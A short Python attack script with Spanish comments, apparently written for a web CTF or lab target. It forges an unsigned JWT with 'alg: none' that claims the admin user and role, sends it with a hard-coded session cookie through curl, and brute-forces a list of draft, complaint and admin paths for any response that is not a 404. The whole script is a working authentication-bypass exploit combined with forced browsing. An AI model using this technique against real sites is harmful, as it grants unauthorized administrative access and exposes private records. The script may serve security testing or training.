#!/usr/bin/env python3
"""Busca la ruta del borrador usando el token admin (alg=none)."""
import base64
import json
import subprocess

COOKIE = "trama_session=h1VKBwbj5fd2y9kKmlmtHKuvSRvGNPtZ9sJODeI7BpN7otZM5b2ZRaw5H8q-CVcQ"
BASE = "https://<host>"


def b64(o) -> str:
    return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).decode().rstrip("=")


TOK = f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64({'user': 'admin', 'nombre': 'Administración', 'depto': 'ADMIN', 'role': 'admin'})}."

rutas = [
    "/borrador", "/borradores", "/denuncias/borrador", "/denuncias/borradores",
    "/borrador/1", "/borradores/1", "/denuncia/borrador", "/publicacion/1",
    "/publicaciones/1", "/post/1", "/posts/1", "/admin", "/admin/", "/admin/borrador",
    "/admin/denuncias", "/panel", "/panel/borrador", "/comite", "/comite/borrador",
    "/informe", "/informes", "/reunion", "/acta", "/internal", "/interno",
    "/api/borrador", "/api/denuncias", "/api/v1/denuncias", "/muro",
    "/denuncias/1", "/denuncias/2", "/denuncias/13", "/denuncias/draft", "/draft",
]
for p in rutas:
    r = subprocess.run(["curl", "-s", "-m", "15", "-b", f"{COOKIE}; vecino_token={TOK}",
                        "-w", "\n__C__%{http_code}", f"{BASE}{p}"], capture_output=True, text=True)
    cuerpo, _, code = r.stdout.rpartition("__C__")
    if code.strip() not in ("404",):
        print(f"{p:24s} -> {code.strip()} ({len(cuerpo)})")
